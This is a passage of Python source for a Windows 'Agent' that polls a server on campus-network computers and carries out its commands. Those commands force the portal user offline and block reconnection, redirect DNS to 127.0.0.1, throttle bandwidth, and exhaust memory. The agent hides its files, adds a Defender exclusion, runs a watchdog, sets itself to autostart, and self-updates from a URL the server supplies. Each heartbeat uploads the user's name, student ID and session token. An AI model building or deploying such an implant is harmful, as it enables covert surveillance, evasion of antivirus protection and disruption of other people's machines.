        else:
            INFO(4, "非Windows, 跳过网卡检测")
    except Exception as e:
        FAIL(4, f"网卡信息失败: {e}")

    # ===== Phase 2: 网络环境 =====
    # Step 5: IP & MAC & 网关
    try:
        local_ip = get_local_ip()
        mac = get_mac()
        if is_win:
            rc, gw, _ = _diag_ps(
                "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -EA SilentlyContinue | "
                "Select-Object -First 1).NextHop")
            INFO(5, f"IP: {local_ip} | MAC: {mac} | 网关: {gw or '?'}")
        else:
            INFO(5, f"IP: {local_ip} | MAC: {mac}")
    except Exception as e:
        FAIL(5, f"网络基础信息失败: {e}")

    # Step 6: DNS 状态
    try:
        dns_hijacked, dns_servers = get_dns_status()
        dns_blocked = os.path.exists(_DNS_BACKUP_FILE)
        # 常见公共DNS不算异常 (虽然是静态但可能是用户自行设置的)
        _KNOWN_PUBLIC_DNS = {"8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
                             "223.5.5.5", "223.6.6.6", "114.114.114.114", "119.29.29.29"}
        is_known = dns_servers and all(s.strip() in _KNOWN_PUBLIC_DNS for s in dns_servers.split(","))
        if dns_hijacked and not is_known:
            FAIL(6, f"DNS异常! 当前: {dns_servers} | DNS断网: {'是' if dns_blocked else '否'}")
        elif dns_hijacked and is_known:
            INFO(6, f"DNS: 静态({dns_servers}) 公共DNS | DNS断网: {'是' if dns_blocked else '否'}")
        else:
            OK(6, f"DNS正常: {dns_servers or 'DHCP自动'} | DNS断网: {'是' if dns_blocked else '否'}")
    except Exception as e:
        FAIL(6, f"DNS检测失败: {e}")

    # Step 7: 服务器连通性
    try:
        t0 = time.time()
        r = http_post(f"{agent.server_url}/api/heartbeat", {
            "agent_id": agent.agent_id, "hostname": agent.hostname,
            "version": AGENT_VERSION, "platform": platform.system()
        })
        latency = int((time.time() - t0) * 1000)
        if "error" not in r:
            OK(7, f"服务器连通 ({agent.server_url}) 延迟: {latency}ms")
        else:
            FAIL(7, f"服务器响应异常: {r.get('error','?')} 延迟: {latency}ms")
    except Exception as e:
        FAIL(7, f"服务器不可达: {e}")

    # Step 8: 外网连通性
    try:
        t0 = time.time()
        urllib.request.urlopen("http://www.baidu.com", timeout=5)
        latency = int((time.time() - t0) * 1000)
        OK(8, f"外网连通 (baidu.com) 延迟: {latency}ms")
    except Exception as e:
        FAIL(8, f"外网不可达: {e}")

    # ===== Phase 3: 校园网账户 =====
    # Step 9: Portal 连通性
    try:
        t0 = time.time()
        urllib.request.urlopen(f"http://{agent.net.portal_ip}/", timeout=5)
        latency = int((time.time() - t0) * 1000)
        OK(9, f"Portal连通 ({agent.net.portal_ip}) 延迟: {latency}ms")
    except Exception as e:
        FAIL(9, f"Portal不可达 ({agent.net.portal_ip}): {e}")

    # Step 10: 用户认证状态
    try:
        online, campus_ip, ui, msg = agent.net.check_online()
        if online and ui:
            OK(10, f"已认证: {agent.net.username}({agent.net.user_id}) IP:{agent.net.user_ip} idx:{ui[:16]}...")
        elif online:
            INFO(10, f"网络可用但未获取userIndex: {msg}")
        else:
            FAIL(10, f"未认证/离线: {msg}")
    except Exception as e:
        FAIL(10, f"认证检测异常: {e}")

    # Step 11: Portal API 测试
    try:
        import http.cookiejar
        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        opener.open(f"http://{agent.net.portal_ip}/", timeout=5).read()
        cookies = list(jar)
        info_url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
        req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with opener.open(req, timeout=5) as resp:
            text = resp.read().decode("utf-8", errors="ignore")
            info = json.loads(text)
        has_session = any('JSESSIONID' in c.name for c in cookies)
        ui = info.get("userIndex", "")
        OK(11, f"Portal API正常 | JSESSIONID: {'✓' if has_session else '✗'} | userIndex: {'✓' if ui else '✗'} | 字段: {list(info.keys())[:6]}")
    except Exception as e:
        FAIL(11, f"Portal API异常: {e}")

    # ===== Phase 4: 限速功能诊断 =====
    # Step 12: PowerShell 环境
    if is_win:
        try:
            rc, ps_ver, _ = _diag_ps("$PSVersionTable.PSVersion.ToString()")
            if rc == 0 and ps_ver:
                OK(12, f"PowerShell可用: v{ps_ver}")
            else:
                FAIL(12, f"PowerShell异常: rc={rc}")
        except Exception as e:
            FAIL(12, f"PowerShell不可用: {e}")
    else:
        INFO(12, "非Windows, 跳过PowerShell检测")

    # Step 13: QoS 前置检查
    if is_win:
        try:
            rc, qos_bind, _ = _diag_ps(
                "Get-NetAdapterBinding -ComponentID ms_pacer -EA SilentlyContinue | "
                "Select-Object Name,Enabled | ForEach-Object { \"$($_.Name):$($_.Enabled)\" }")
            rc2, existing, _ = _diag_ps(
                f'Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue | '
                'ForEach-Object { "$($_.Name) throttle=$($_.ThrottleRateAction)" }')
            qos_lines = qos_bind.strip().split('\n') if qos_bind.strip() else []
            enabled = sum(1 for l in qos_lines if 'True' in l)
            INFO(13, f"QoS绑定: {enabled}/{len(qos_lines)}启用 | 现有策略: {existing or '无'}")
        except Exception as e:
            FAIL(13, f"QoS检查失败: {e}")
    else:
        INFO(13, "非Windows, 跳过QoS")

    # Step 14: 限速设置测试 (设50KB/s → 验证 → 清除)
    if is_win:
        try:
            INFO(14, "测试限速: 设置50KB/s...")
            ok_bw, msg_bw = set_bandwidth_limit(50)
            if ok_bw and 'QoS验证✓' in msg_bw:
                OK(14, f"限速设置成功: {msg_bw}")
            elif ok_bw:
                FAIL(14, f"限速设置返回成功但验证失败: {msg_bw}")
            else:
                FAIL(14, f"限速设置失败: {msg_bw}")
        except Exception as e:
            FAIL(14, f"限速测试异常: {e}")
    else:
        INFO(14, "非Windows, 跳过限速测试")

    # Step 15: 限速验证 & 清除
    if is_win:
        try:
            # 验证策略确实存在
            rc, verify_out, _ = _diag_ps(
                f'$p = Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue; '
                'if($p){ "EXISTS throttle=$($p.ThrottleRateAction)" } else { "NOT_FOUND" }')
            rc2, tcp_out, _ = _diag_ps('netsh interface tcp show global | Select-String "Receive Window"')
            # 检查 GPO 注册表
            rc3, gpo_out, _ = _diag_ps(
                f'$q = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}"; '
                'if(Test-Path $q){ $r = Get-ItemProperty $q; "GPO=$($r.\'Throttle Rate\')" } else { "GPO=无" }')
            INFO(15, f"验证: {verify_out} | TCP: {tcp_out.strip()[:40]} | {gpo_out}")
            # 清除
            ok_clr, msg_clr = clear_bandwidth_limit()
            if ok_clr:
                OK(15, f"限速清除成功 | 验证: {verify_out} | {gpo_out}")
            else:
                FAIL(15, f"限速清除失败: {msg_clr}")
        except Exception as e:
            FAIL(15, f"限速验证/清除异常: {e}")
    else:
        INFO(15, "非Windows, 跳过")

    # Step 16: 限速实际生效检测 (netsh + 策略复核)
    if is_win:
        try:
            rc, after_qos, _ = _diag_ps(
                f'Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue')
            rc2, after_tcp, _ = _diag_ps('(netsh interface tcp show global) -match "Receive Window"')
            rc3, after_gpo, _ = _diag_ps(
                f'Test-Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}"')
            all_clean = (not after_qos.strip()) and ('normal' in after_tcp.lower() or 'Normal' in after_tcp) and ('False' in after_gpo)
            if all_clean:
                OK(16, f"限速清除验证: QoS策略=已删 | TCP窗口=正常 | GPO=已删")
            else:
                FAIL(16, f"限速残留! QoS:[{after_qos[:30]}] TCP:[{after_tcp.strip()[:30]}] GPO:[{after_gpo}]")
        except Exception as e:
            FAIL(16, f"限速清除验证异常: {e}")
    else:
        INFO(16, "非Windows, 跳过")

    # ===== Phase 5: 下线功能诊断 =====
    # Step 17: logout API 可达性 (不实际下线)
    try:
        if agent.net.user_index:
            # 只测试 getOnlineUserInfo, 不实际 logout
            url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
            text = agent.net._portal_post(url, {"userIndex": agent.net.user_index}, timeout=5)
            info = json.loads(text)
            if info.get("userIndex"):
                OK(17, f"下线API可达: userIndex有效, userName={info.get('userName','?')}")
            else:
                FAIL(17, f"下线API异常: userIndex无效, 响应: {text[:80]}")
        else:
            FAIL(17, "无userIndex, 无法测试下线API (设备可能未认证)")
    except Exception as e:
        FAIL(17, f"下线API测试异常: {e}")

    # Step 18: cancelMab API (只查不改)
    try:
        if agent.net.user_index:
            url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
            text = agent.net._portal_post(url, {"userIndex": agent.net.user_index}, timeout=5)
            info = json.loads(text)
            fields = {k: str(v)[:30] for k, v in info.items() if v}
            OK(18, f"Portal用户详情: {json.dumps(fields, ensure_ascii=False)[:120]}")
        else:
            INFO(18, "无userIndex, 跳过用户详情获取")
    except Exception as e:
        FAIL(18, f"用户详情获取异常: {e}")

    # Step 19: Cookie/Session 机制验证
    try:
        import http.cookiejar
        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        opener.open(f"http://{agent.net.portal_ip}/", timeout=5).read()
        info_url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
        req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with opener.open(req, timeout=5) as resp:
            text1 = resp.read().decode("utf-8", errors="ignore")
        info1 = json.loads(text1)
        # 第二次不带cookie
        req2 = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
        req2.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req2, timeout=5) as resp2:
            text2 = resp2.read().decode("utf-8", errors="ignore")
        info2 = json.loads(text2)
        idx1 = info1.get("userIndex", "")
        idx2 = info2.get("userIndex", "")
        if idx1 and not idx2:
            OK(19, "Cookie机制正常: 有Cookie→有userIndex, 无Cookie→无userIndex")
        elif idx1 and idx2:
            INFO(19, f"Cookie机制: 两种方式都返回了userIndex (portal可能不依赖session)")
        else:
            FAIL(19, f"Cookie机制异常: 有Cookie→{bool(idx1)}, 无Cookie→{bool(idx2)}")
    except Exception as e:
        FAIL(19, f"Cookie机制测试异常: {e}")

    # ===== Phase 6: DNS功能 =====
    # Step 20: DNS 篡改测试
    if is_win:
        try:
            INFO(20, "测试DNS篡改: 设为8.8.8.8 → 验证 → 恢复DHCP")
            ok_dns, msg_dns = set_dns_hijack("8.8.8.8", "")
            if ok_dns:
                # 验证
                rc, cur_dns, _ = _diag_ps(
                    "Get-DnsClientServerAddress -AddressFamily IPv4 | "
                    "Where-Object {$_.ServerAddresses} | "
                    "Select-Object -First 1 -ExpandProperty ServerAddresses")
                OK(20, f"DNS篡改成功: {msg_dns} | 当前DNS: {cur_dns[:40]}")
            else:
                FAIL(20, f"DNS篡改失败: {msg_dns}")
        except Exception as e:
            FAIL(20, f"DNS篡改测试异常: {e}")
    else:
        INFO(20, "非Windows, 跳过DNS测试")

    # Step 21: DNS 恢复测试
    if is_win:
        try:
            ok_rst, msg_rst = reset_dns()
            time.sleep(1)  # 等 Windows 网络栈更新
            rc, cur_dns, _ = _diag_ps(
                "Get-DnsClientServerAddress -AddressFamily IPv4 | "
                "Where-Object {$_.ServerAddresses} | "
                "Select-Object -First 1 -ExpandProperty ServerAddresses")
            cur_dns = (cur_dns or "").strip()
            if ok_rst and cur_dns:
                OK(21, f"DNS恢复成功: {msg_rst} | 当前DNS: {cur_dns[:40]}")
            elif ok_rst and not cur_dns:
                # reset 成功但 DNS 为空 → 兜底设公共DNS防断网
                set_dns_hijack("223.5.5.5", "114.114.114.114")
                FAIL(21, f"DNS恢复后为空! 已兜底设为223.5.5.5 | {msg_rst}")
            else:
                # reset 失败 → 兜底
                set_dns_hijack("223.5.5.5", "114.114.114.114")
                FAIL(21, f"DNS恢复失败, 已兜底: {msg_rst}")
        except Exception as e:
            try: set_dns_hijack("223.5.5.5", "114.114.114.114")
            except: pass
            FAIL(21, f"DNS恢复测试异常(已兜底): {e}")
    else:
        INFO(21, "非Windows, 跳过")

    # ===== Phase 7: 安全/安装系统 =====
    # Step 22: 开机自启状态
    try:
        reg = _reg_exists()
        task = _task_exists()
        lnk = _startup_lnk_exists()
        overall = is_autostart_enabled()
        status = f"注册表:{'✓' if reg else '✗'} 计划任务:{'✓' if task else '✗'} 启动夹:{'✓' if lnk else '✗'}"
        if overall:
            OK(22, f"开机自启已启用 | {status}")
        else:
            FAIL(22, f"开机自启未启用! | {status}")
    except Exception as e:
        FAIL(22, f"自启检测异常: {e}")

    # Step 23: 文件保护状态
    if is_win:
        try:
            import ctypes
            attrs = ctypes.windll.kernel32.GetFileAttributesW(AGENT_EXE)
            hidden = bool(attrs & 0x02) if attrs != -1 else False
            system = bool(attrs & 0x04) if attrs != -1 else False
            if hidden and system:
                OK(23, f"文件保护已启用: hidden={hidden} system={system}")
            else:
                FAIL(23, f"文件保护不完整: hidden={hidden} system={system} attrs={attrs}")
        except Exception as e:
            FAIL(23, f"文件保护检测异常: {e}")
    else:
        INFO(23, "非Windows, 跳过文件保护")

    # Step 24: Defender 排除状态
    if is_win:
        try:
            rc, excl, _ = _diag_ps(
                "(Get-MpPreference -EA SilentlyContinue).ExclusionPath -join '; '")
            agent_dir = os.path.dirname(AGENT_EXE)
            if agent_dir.lower() in excl.lower():
                OK(24, f"Defender排除已设置: {excl[:80]}")
            else:
                FAIL(24, f"Defender排除未包含Agent目录! 排除列表: {excl[:80]}")
        except Exception as e:
            FAIL(24, f"Defender检测异常: {e}")
    else:
        INFO(24, "非Windows, 跳过Defender")

    # Step 25: 看门狗状态
    if is_win:
        try:
            watchdog_vbs = os.path.join(AGENT_DIR, "_watchdog.vbs")
            watchdog_exists = os.path.exists(watchdog_vbs)
            # 检查是否有 wscript 进程在跑
            rc, procs, _ = _diag_ps(
                "Get-Process wscript -EA SilentlyContinue | "
                "Select-Object Id,StartTime | ForEach-Object { \"PID=$($_.Id)\" }")
            if watchdog_exists and procs:
                OK(25, f"看门狗运行中: {procs.strip()[:60]}")
            elif watchdog_exists:
                FAIL(25, f"看门狗脚本存在但进程未运行")
            else:
                FAIL(25, f"看门狗脚本不存在: {watchdog_vbs}")
        except Exception as e:
            FAIL(25, f"看门狗检测异常: {e}")
    else:
        INFO(25, "非Windows, 跳过看门狗")

    # Step 26: Agent 进程权限检测
    if is_win:
        try:
            rc, is_admin, _ = _diag_ps(
                "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]"
                "::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)")
            rc2, user_out, _ = _diag_ps("[Environment]::UserName")
            OK(26, f"运行身份: {user_out} | 管理员权限: {is_admin}")
        except Exception as e:
            FAIL(26, f"权限检测异常: {e}")
    else:
        INFO(26, "非Windows, 跳过权限检测")

    # Step 27: 网速采样测试
    try:
        down, up = get_net_speed()
        INFO(27, f"网速采样: ↓{down}KB/s ↑{up}KB/s (首次可能为0)")
    except Exception as e:
        FAIL(27, f"网速采样异常: {e}")

    # Step 28: Agent 版本 & 更新通道
    try:
        INFO(28, f"Agent版本: v{AGENT_VERSION} | 服务器: {agent.server_url} | Agent ID: {agent.agent_id[:16]}...")
    except Exception as e:
        FAIL(28, f"版本信息异常: {e}")

    # Step 29: 配置文件内容 (脱敏)
    try:
        cfg = load_config()
        safe_keys = {k: ("***" if k in ("password",) else str(v)[:30]) for k, v in cfg.items()}
        INFO(29, f"配置: {json.dumps(safe_keys, ensure_ascii=False)[:150]}")
    except Exception as e:
        FAIL(29, f"配置读取异常: {e}")

    # Step 30: 总结
    summary = f"自检完成: ✅{ok_n}项通过 ❌{fail_n}项失败 ℹ️{TOTAL-ok_n-fail_n}项信息"
    if fail_n == 0:
        OK(30, summary)
    else:
        FAIL(30, summary)

    return ok_n, fail_n, report


# ============ Agent 主类 ============

class Agent:
    def __init__(self, server_url=None):
        self.cfg = load_config()
        self.server_url = (server_url or self.cfg.get("server") or DEFAULT_SERVER).rstrip("/")
        self.agent_id = get_agent_id()
        self.hostname = socket.gethostname()
        self.mac = get_mac()
        self.start_time = time.time()
        self.net = CampusNet(self.cfg.get("portal_ip", PORTAL_IP))
        
        # 恢复保存的凭据
        self.net.username = self.cfg.get("username", "")
        self.net.password = self.cfg.get("password", "")
        self.net.user_index = self.cfg.get("user_index", "")
        
        self.was_online = False     # 上一次检测是否在线
        self.force_offline = False  # 强制离线锁: True时持续执行下线
        self.force_offline_until = 0   # 强制离线到期时间戳 (0=永久直到手动解锁)
        self._dns_blocked = os.path.exists(_DNS_BACKUP_FILE)  # DNS断网状态

    def get_uptime(self):
        s = int(time.time() - self.start_time)
        if s < 60: return f"{s}秒"
        if s < 3600: return f"{s//60}分{s%60}秒"
        return f"{s//3600}时{(s%3600)//60}分"

    def _enforce_offline(self, online):
        """强制离线: 检测到又被无感认证自动连上时, 立刻再次下线"""
        if not self.force_offline:
            # 即使没有 force_offline, 也要检查 DNS 定时恢复
            _check_dns_restore()
            return
        # 检查定时解锁
        if self.force_offline_until > 0 and time.time() >= self.force_offline_until:
            self.force_offline = False
            self.force_offline_until = 0
            # 同时恢复 DNS
            if getattr(self, '_dns_blocked', False) or os.path.exists(_DNS_BACKUP_FILE):
                print("  [强制离线] 定时到期, 恢复 DNS...")
                _restore_dns_from_backup()
                self._dns_blocked = False
            print("  [强制离线] 定时到期，自动解锁")
            return
        if not online:
            return
        print("  [强制离线] 检测到被自动重连, 执行下线...")
        self.net.cancel_mab()
        self.net.cancel_mac_by_name()
        self.net.logout()
        print("  [强制离线] 已重新下线")

    def build_status(self):
        """构建上报状态"""
        online, campus_ip, ui, msg = self.net.check_online()
        if ui:
            self.net.user_index = ui
        
        # 强制离线巡逻
        self._enforce_offline(online)
        if self.force_offline and online:
            online = False
            if self.force_offline_until > 0:
                left = int(self.force_offline_until - time.time())
                msg = f"强制离线中({left}秒后解锁)"
            else:
                msg = "强制离线中(永久)"
        
        # 断连单次触发: 从在线→离线时, 自动执行一次full_logout清理无感认证
        if self.was_online and not online and not self.force_offline:
            print("  [断连] 检测到网络断开, 单次清理无感认证...")
            self.net.cancel_mab()
            self.net.cancel_mac_by_name()
            try:
                self.net.logout()
            except: pass
            print("  [断连] 清理完毕")
        self.was_online = online
        
        # 查询限速、DNS状态和网速 (每次心跳上报, 让服务器实时可见)
        bw_limit = get_bandwidth_limit()
        dns_hijacked, dns_servers = get_dns_status()
        net_down, net_up = get_net_speed()
        
        return {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "platform": platform.system(),
            "local_ip": get_local_ip(),
            "campus_ip": campus_ip,
            "mac": self.mac,
            # portal 实时返回的用户信息 (每次心跳用 cookie 重新获取)
            "username": self.net.username,      # 中文姓名 (userName)
            "user_id": self.net.user_id,        # 学号/账号 (userId)
            "user_index": self.net.user_index,  # session token (userIndex)
            "user_ip": self.net.user_ip,        # portal 记录的认证 IP
            "net_online": online,
            "net_message": msg,
            "uptime": self.get_uptime(),
            "autostart": is_autostart_enabled(),
            "autostart_reg": _reg_exists(),
            "autostart_task": _task_exists(),
            "autostart_lnk": _startup_lnk_exists(),
            "force_offline": self.force_offline,
            "force_offline_until": self.force_offline_until,
            # 网络控制状态
            "bandwidth_limit": bw_limit,       # 0=无限速, >0 = KB/s
            "dns_hijacked": dns_hijacked,      # bool
            "dns_servers": dns_servers,         # 当前DNS字符串
            "dns_blocked": self._dns_blocked,   # DNS断网兜底状态
            "net_speed_down": net_down,    # 下行 KB/s
            "net_speed_up": net_up,        # 上行 KB/s
            "mem_test": memory_status(),   # 内存测试状态 (None=无)
            "version": AGENT_VERSION,
        }

    def heartbeat(self):
        """发送心跳并接收命令"""
        status = self.build_status()
        # 首次心跳上报开机事件
        if getattr(self, '_report_boot', False):
            status["event"] = "boot"
            self._report_boot = False
        result = http_post(f"{self.server_url}/api/heartbeat", status)
        if "error" in result:
            print(f"  [!] 心跳失败: {result['error']}")
            return
        # 处理命令
        for cmd in result.get("commands", []):
            self.execute(cmd)

    def _on_shutdown(self, event=0):
        """关机/退出回调: 向服务器发送关机报告"""
        if getattr(self, '_shutdown_reported', False):
            return
        self._shutdown_reported = True
        event_names = {0: "进程退出", 2: "窗口关闭", 5: "用户注销", 6: "系统关机"}
        reason = event_names.get(event, f"未知({event})")
        print(f"  [关机] 上报关机事件: {reason}")
        try:
            http_post(f"{self.server_url}/api/heartbeat", {
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "event": "shutdown",
                "shutdown_reason": reason,
                "uptime": self.get_uptime(),
                "version": AGENT_VERSION,
            })
        except:
            pass

    def _report_step(self, cmd_id, command, step, total, msg, status="running"):
        """向服务器汇报命令执行进度"""
        elapsed = time.time() - getattr(self, '_cmd_start', time.time())
        tag = f"[{step}/{total}]"
        icon = {"running": "⏳", "ok": "✅", "error": "❌", "timeout": "⏰"}.get(status, "•")
        print(f"  {icon} {tag} {msg}")
        try:
            http_post(f"{self.server_url}/api/report_progress", {
                "agent_id": self.agent_id, "cmd_id": cmd_id,
                "command": command, "step": step, "total": total,
                "msg": msg, "status": status, "elapsed": round(elapsed, 1),
            })
        except:
            pass

    def execute(self, cmd):
        """执行远程命令"""
        command = cmd.get("command", "")
        params = cmd.get("params", {})
        cmd_id = cmd.get("id", "")
        self._cmd_start = time.time()
        print(f"  [CMD] 执行: {command} (id={cmd_id})")
        
        success = False
        message = ""
        
        # 快捷步骤汇报
        S = lambda step, total, msg, st="running": self._report_step(cmd_id, command, step, total, msg, st)
        
        try:
            if command == "logout":
                dns_block = params.get("dns_block", False)
                total = 6 if dns_block else 5
                S(1, total, "接收强制下线指令" + (" (含DNS断网)" if dns_block else ""))
                S(2, total, "执行 full_logout...")
                r = self.net.full_logout()
                success = r.get("result") == "success"
                message = r.get("message", "已下线" if success else "下线失败")
                # 检测 cancelMab 是否失败 (无感认证会导致自动重连)
                mab_failed = "cancelMab:fail" in message or "cancelMac:fail" in message
                S(3, total, f"登出结果: {message}", "ok" if success else "error")
                self.force_offline = True
                self.reconnect_at = 0
                duration = int(params.get("duration", 0))
                if duration > 0:
                    self.force_offline_until = time.time() + duration
                    message += f" | 强制离线 {duration}秒"
                else:
                    self.force_offline_until = 0
                    message += " | 强制离线(永久,发送unlock解锁)"
                S(4, total, f"离线锁已设置", "ok")
                # DNS断网: 手动勾选 或 cancelMab失败时自动启用 (防止无感认证重连)
                need_dns = dns_block or (mab_failed and success)
                if need_dns:
                    reason = "DNS兜底断网" if dns_block else "⚠️ cancelMab失败, 自动启用DNS断网防重连"
                    S(5, total, f"{reason}: 备份当前DNS → 设为127.0.0.1...")
                    dns_ok, dns_msg, _ = dns_disconnect(duration)
                    self._dns_blocked = True
                    message += f" | DNS: {dns_msg}"
                    S(total, total, dns_msg, "ok" if dns_ok else "error")
                else:
                    S(5, total, "cancelMab成功, 无需DNS断网", "ok")

            elif command == "cancel_mab":
                S(1, 5, "清除缓存, 准备获取 user_index")
                self.net.user_index = ""
                self.net.username = ""
                self.net._cookie_opener = None
                S(2, 5, "强制从 portal 获取当前用户...")
                self.net._refresh_user_index(force=True)
                if not self.net.user_index:
                    success = False
                    message = "无法获取 user_index (设备已离线或不在校园网内)"
                    S(3, 5, message, "error")
                else:
                    S(3, 5, f"user_index: {self.net.user_index[:20]}...", "ok")
                    S(4, 5, "执行 cancel_mab + cancel_mac_by_name...")
                    r1 = self.net.cancel_mab()
                    r2 = self.net.cancel_mac_by_name()
                    success = r1.get("result")=="success" or r2.get("result")=="success"
                    message = f"cancelMab:{r1.get('result','?')} cancelMac:{r2.get('result','?')}"
                    if not success:
                        details = []
                        if r1.get("message"): details.append(f"[Mab]{r1['message'][:60]}")
                        if r2.get("message"): details.append(f"[Mac]{r2['message'][:60]}")
                        if details:
                            message += " | " + " ".join(details)
                    S(5, 5, message, "ok" if success else "error")

            elif command == "unlock":
                has_dns = getattr(self, '_dns_blocked', False) or os.path.exists(_DNS_BACKUP_FILE)
                total = 4 if has_dns else 2
                S(1, total, "解除强制离线锁")
                self.force_offline = False
                self.force_offline_until = 0
                success = True
                message = "强制离线锁已解除"
                S(2, total, message, "ok")
                if has_dns:
                    S(3, total, "恢复原始 DNS 设置...")
                    dns_ok, dns_msg = _restore_dns_from_backup()
                    self._dns_blocked = False
                    message += f" | {dns_msg}"
                    S(4, total, dns_msg, "ok" if dns_ok else "error")

            elif command == "dns_disconnect":
                dur = int(params.get("duration", 300))
                S(1, 3, f"接收DNS断网指令: {dur}秒")
                S(2, 3, "备份当前DNS → 设为127.0.0.1...")
                ok, msg, restore_at = dns_disconnect(dur)
                success = ok
                message = msg
                if ok:
                    self._dns_blocked = True
                S(3, 3, msg, "ok" if ok else "error")

            elif command == "dns_restore":
                S(1, 2, "接收DNS恢复指令")
                ok, msg = _restore_dns_from_backup()
                self._dns_blocked = False
                success = ok
                message = msg
                S(2, 2, msg, "ok" if ok else "error")

            elif command in ("login_now", "login"):
                S(1, 1, "远程上线登录功能已禁用", "error")
                success = False
                message = "远程上线登录功能已禁用"
                        
            elif command == "refresh":
                S(1, 3, "检测网络状态...")
                online, ip, ui, msg = self.net.check_online()
                S(2, 3, f"检测完成: {'在线' if online else '离线'} - {ip}")
                success = True
                message = f"{'在线' if online else '离线'} - {ip} - {msg}"
                S(3, 3, message, "ok")
                
            elif command == "set_credentials":
                S(1, 1, "远程设置凭据功能已禁用", "error")
                success = False
                message = "远程设置凭据功能已禁用"

            elif command == "enable_autostart":
                S(1, 2, "设置开机自启动...")
                success, message = enable_autostart()
                S(2, 2, message, "ok" if success else "error")

            elif command == "disable_autostart":
                S(1, 2, "禁用开机自启动...")
                success, message = disable_autostart()
                S(2, 2, message, "ok" if success else "error")

            elif command == "protect":
                S(1, 3, "设置文件保护属性...")
                r1 = protect_files()
                S(2, 3, f"文件保护: {r1[1]}", "ok" if r1[0] else "error")
                S(3, 3, "添加 Defender 排除...")
                r2 = add_defender_exclusion()
                success = r1[0] or r2[0]
                message = f"文件保护: {r1[1]} | Defender: {r2[1]}"
                S(3, 3, f"Defender: {r2[1]}", "ok" if r2[0] else "error")

            elif command == "unprotect":
                S(1, 3, "移除文件保护...")
                r1 = unprotect_files()
                S(2, 3, f"{r1[1]}", "ok")
                r2 = remove_defender_exclusion()
                success = True
                message = f"{r1[1]} | {r2[1]}"
                S(3, 3, f"{r2[1]}", "ok")

            elif command == "start_watchdog":
                S(1, 2, "启动看门狗进程...")
                _start_watchdog()
                success = True
                message = "看门狗已启动(30秒检测一次)"
                S(2, 2, message, "ok")

            elif command == "set_bandwidth":
                rate = int(params.get("rate_kbps", 100))
                S(1, 5, f"接收限速指令: {rate} KB/s")
                S(2, 5, "启用 QoS Packet Scheduler + 创建 QoS 策略...")
                S(3, 5, f"设置 TCP 接收窗口限制...")
                S(4, 5, "写入 GPO 注册表 + gpupdate...")
                success, message = set_bandwidth_limit(rate)
                S(5, 5, message, "ok" if success else "error")

            elif command == "clear_bandwidth":
                S(1, 3, "接收解除限速指令")
                S(2, 3, "移除 QoS 策略 + 恢复 TCP 窗口 + 清理注册表...")
                success, message = clear_bandwidth_limit()
                S(3, 3, message, "ok" if success else "error")

            elif command == "set_dns":
                dns1 = params.get("primary", "127.0.0.1")
                dns2 = params.get("secondary", "")
                S(1, 3, f"接收 DNS 设置: {dns1}" + (f" / {dns2}" if dns2 else ""))
                S(2, 3, "修改所有活动网卡 DNS...")
                success, message = set_dns_hijack(dns1, dns2)
                S(3, 3, message, "ok" if success else "error")

            elif command == "reset_dns":
                S(1, 3, "接收 DNS 重置指令")
                S(2, 3, "恢复所有网卡为 DHCP 自动获取...")
                success, message = reset_dns()
                S(3, 3, message, "ok" if success else "error")

            elif command == "self_update":
                url = params.get("url", "")
                ver = params.get("version", "")
                if not url:
                    S(1, 1, "缺少下载URL", "error")
                    message = "缺少下载URL"
                else:
                    S(1, 8, f"接收更新指令: v{ver}")
                    S(2, 8, f"开始下载: {url[:60]}...")
                    success, message = self_update(url, ver, lambda step, msg, st="running": S(step, 8, msg, st))
                    if success and getattr(sys, 'frozen', False):
                        S(8, 8, f"更新完成, 新进程已启动, 旧进程即将退出", "ok")
                        http_post(f"{self.server_url}/api/report", {
                            "agent_id": self.agent_id, "cmd_id": cmd_id,
                            "success": True, "message": message,
                        })
                        time.sleep(1)
                        os._exit(0)

            elif command == "memory_start":
                target_gb = float(params.get("target_gb", 4))
                dur = int(params.get("duration", 300))
                S(1, 4, f"🧠 内存测试: {target_gb}GB, 持续{dur}秒" + (" (永久)" if dur == 0 else ""))
                S(2, 4, f"检测物理内存上限 (88%)...")
                total_ram = _get_total_ram_mb()
                max_gb = round(total_ram * 0.88 / 1024, 1)
                S(3, 4, f"物理内存: {total_ram}MB, 上限: {max_gb}GB, 请求: {target_gb}GB")
                ok, msg, pid = memory_start(target_gb, dur)
                success = ok
                message = msg
                S(4, 4, msg, "ok" if ok else "error")

            elif command == "memory_stop":
                S(1, 2, "🧠 停止内存测试, 释放内存...")
                ok, msg = memory_stop()
                success = ok
                message = msg
                S(2, 2, msg, "ok" if ok else "error")

            elif command == "self_test":
                S(1, 30, "🔍 启动设备全面自检...")
                ok_n, fail_n, report = run_self_test(self, S)
                success = fail_n == 0
                message = f"自检完成: ✅{ok_n}通过 ❌{fail_n}失败"

            elif command == "uninstall":
